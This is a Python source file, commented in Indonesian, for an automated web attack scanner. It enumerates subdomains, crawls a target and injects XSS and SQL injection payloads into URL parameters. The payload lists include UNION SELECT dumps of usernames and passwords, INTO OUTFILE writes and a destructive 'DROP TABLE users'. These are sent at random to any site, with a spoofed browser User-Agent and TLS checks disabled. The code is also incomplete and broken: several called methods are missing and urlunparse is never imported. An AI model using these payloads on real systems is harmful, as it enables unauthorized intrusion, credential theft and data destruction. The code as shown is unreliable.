import asyncio
import re
import requests
import random
import socket
import aiohttp
import aiodns
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

class AdvancedScanner:
    def __init__(self):
        self.common_admin_paths = self._load_admin_paths()
        self.common_files = self._load_common_files()
        self.session = self._create_session()
        self.xss_payloads = self._load_xss_payloads()
        self.sql_payloads = self._load_sql_payloads()
        self.subdomain_wordlist = self._load_subdomain_wordlist()
        self.dns_resolver = aiodns.DNSResolver()
        self.executor = ThreadPoolExecutor(max_workers=50)
    
    def _create_session(self):
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        })
        return session

    def _load_xss_payloads(self):
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "javascript:alert(1)",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=\"javascript:alert(1)\">",
            "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
            "<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
            "\" autofocus onfocus=alert(1) \"",
            "' autofocus onfocus=alert(1) '",
            "<details/open/ontoggle=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<form action=\"javascript:alert(1)\"><input type=submit>",
            "<math href=\"javascript:alert(1)\">CLICKME</math>",
            "<link rel=stylesheet href=\"javascript:alert(1)\">",
            "<style>@import \"javascript:alert(1)\";</style>",
            "<div style=\"background-image:url(javascript:alert(1))\">"
        ]

    def _load_sql_payloads(self):
        return [
            "' OR 1=1--",
            "\" OR \"\"=\"",
            "' OR ''='",
            "' OR 1=1#",
            "\" OR 1=1--",
            "' OR 'a'='a",
            "\" OR \"a\"=\"a",
            "') OR ('a'='a",
            "admin'--",
            "' UNION SELECT NULL, username, password FROM users--",
            "' UNION SELECT 1,@@version,3,4--",
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' WAITFOR DELAY '0:0:5'--",
            "1; DROP TABLE users",
            "' OR SLEEP(5)#",
            "1' ORDER BY 10--",
            "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            "' OR 1=1 LIMIT 1,1--",
            "' OR 1=1 INTO OUTFILE '/tmp/outfile'--",
            "1 AND (SELECT * FROM (SELECT(SLEEP(5)))abc)"
        ]
    
    def _load_subdomain_wordlist(self):
        return [
            "www", "mail", "ftp", "admin", "webmail", "smtp", "pop", "imap", 
            "test", "dev", "development", "staging", "secure", "portal", 
            "cpanel", "whm", "webdisk", "webmin", "ns", "ns1", "ns2", 
            "dns", "dns1", "dns2", "blog", "m", "mobile", "api", "app", 
            "apps", "shop", "store", "support", "status", "stats", "static", 
            "media", "images", "img", "cdn", "cdn1", "cdn2", "cdn3", "chat", 
            "forum", "forums", "news", "download", "downloads", "search", 
            "doc", "docs", "wiki", "calendar", "events", "web", "beta", 
            "alpha", "stage", "demo", "backup", "backups", "old", "new", 
            "vpn", "ssh", "git", "svn", "mysql", "phpmyadmin", "server", 
            "email", "webadmin", "direct", "directadmin", "sites", "site", 
            "intranet", "intern", "internal", "internet", "db", "database",
            "old", "new", "test1", "test2", "test3", "dev1", "dev2", "dev3",
            "staging1", "staging2", "staging3", "api1", "api2", "api3",
            "secure1", "secure2", "secure3", "admin1", "admin2", "admin3",
            "mail1", "mail2", "mail3", "web1", "web2", "web3", "app1", "app2",
            "app3", "mobile1", "mobile2", "mobile3", "static1", "static2",
            "static3", "media1", "media2", "media3", "cdn4", "cdn5", "cdn6",
            "mssql", "oracle", "postgres", "redis", "mongodb", "couchdb",
            "elasticsearch", "kibana", "grafana", "prometheus", "jenkins",
            "gitlab", "github", "bitbucket", "jira", "confluence", "nexus",
            "sonar", "splunk", "vcenter", "vmware", "k8s", "kubernetes",
            "docker", "swarm", "consul", "vault", "rabbitmq", "activemq",
            "zookeeper", "kafka", "nfs", "samba", "ldap", "ad", "radius",
            "vpn1", "vpn2", "vpn3", "owa", "exchange", "outlook", "activedirectory"
        ]

    # ... (fungsi lain tetap sama) ...

    async def full_scan(self, url):
        """Jalankan pemindaian komprehensif"""
        results = {
            "admin_panels": [],
            "sensitive_files": [],
            "vulnerable_endpoints": [],
            "crawled_links": [],
            "subdomains": [],
            "xss_vulnerabilities": [],
            "sql_injections": []
        }

        # Normalisasi URL
        base_url = self.normalize_url(url)
        domain = urlparse(base_url).netloc
        
        # Step 1: Enumerasi subdomain
        results["subdomains"] = await self.enumerate_subdomains(domain)
        
        # Step 2: Crawling dasar
        results["crawled_links"] = await self.crawl_site(base_url)
        
        # Step 3: Deteksi admin panels
        results["admin_panels"] = await self.detect_admin_panels(base_url)
        
        # Step 4: Deteksi file sensitif
        results["sensitive_files"] = await self.find_sensitive_files(base_url)
        
        # Step 5: Scan kerentanan XSS
        results["xss_vulnerabilities"] = await self.scan_xss_vulnerabilities(results["crawled_links"])
        
        # Step 6: Scan kerentanan SQLi
        results["sql_injections"] = await self.scan_sql_injections(results["crawled_links"])
        
        return results

    async def enumerate_subdomains(self, domain):
        """Enumerasi subdomain dengan DNS lookup"""
        tasks = []
        for sub in self.subdomain_wordlist:
            full_domain = f"{sub}.{domain}"
            tasks.append(self.resolve_subdomain(full_domain))
        
        results = await asyncio.gather(*tasks)
        return [result for result in results if result]

    async def resolve_subdomain(self, domain):
        """Cek keberadaan subdomain melalui DNS"""
        try:
            await self.dns_resolver.query(domain, 'A')
            return domain
        except aiodns.error.DNSError:
            return None

    async def scan_xss_vulnerabilities(self, urls):
        """Scan kerentanan XSS pada kumpulan URL"""
        vulnerabilities = []
        tasks = []
        
        for url in urls:
            if '?' in url:  # Hanya URL dengan parameter
                tasks.append(self.test_xss(url))
        
        results = await asyncio.gather(*tasks)
        
        for url, payload, is_vulnerable in results:
            if is_vulnerable:
                vulnerabilities.append({
                    "url": url,
                    "payload": payload,
                    "vulnerable": True
                })
        
        return vulnerabilities

    async def test_xss(self, url):
        """Uji kerentanan XSS pada URL tertentu"""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        if not query_params:
            return (url, "", False)
        
        # Pilih payload secara acak
        payload = random.choice(self.xss_payloads)
        
        # Buat URL baru dengan payload
        new_query = {}
        for param, values in query_params.items():
            new_query[param] = payload
        
        new_query_str = urlencode(new_query, doseq=True)
        target_url = urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query_str,
            parsed_url.fragment
        ))
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    target_url, 
                    headers={"User-Agent": self.session.headers["User-Agent"]},
                    timeout=5,
                    ssl=False
                ) as response:
                    response_text = await response.text()
                    
                    # Deteksi apakah payload dieksekusi
                    is_vulnerable = payload in response_text
                    return (url, payload, is_vulnerable)
        except:
            return (url, payload, False)

    async def scan_sql_injections(self, urls):
        """Scan kerentanan SQL injection pada kumpulan URL"""
        vulnerabilities = []
        tasks = []
        
        for url in urls:
            if '?' in url:  # Hanya URL dengan parameter
                tasks.append(self.test_sql_injection(url))
        
        results = await asyncio.gather(*tasks)
        
        for url, payload, is_vulnerable in results:
            if is_vulnerable:
                vulnerabilities.append({
                    "url": url,
                    "payload": payload,
                    "vulnerable": True
                })
        
        return vulnerabilities

    async def test_sql_injection(self, url):
        """Uji kerentanan SQL injection pada URL tertentu"""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        if not query_params:
            return (url, "", False)
        
        # Pilih payload secara acak
        payload = random.choice(self.sql_payloads)
        
        # Buat URL baru dengan payload
        new_query = {}
        for param, values in query_params.items():
            new_query[param] = payload
        
        new_query_str = urlencode(new_query, doseq=True)
        target_url = urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query_str,
            parsed_url.fragment
        ))
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    target_url, 
                    headers={"User-Agent": self.session.headers["User-Agent"]},
                    timeout=5,
                    ssl=False
                ) as response:
                    response_text = await response.text()
                    
                    # Deteksi error messages yang mengindikasikan SQLi
                    sql_errors = [
                        "SQL syntax",
                        "MySQL server",
                        "ORA-",
                        "syntax error",
                        "unclosed quotation mark",
                        "PostgreSQL",
                        "Microsoft Access",
                        "ODBC",
                        "JDBC",
                        "SQLite",
                        "MariaDB"
                    ]
                    
                    is_vulnerable = any(error in response_text for error in sql_errors)
                    return (url, payload, is_vulnerable)
        except:
            return (url, payload, False)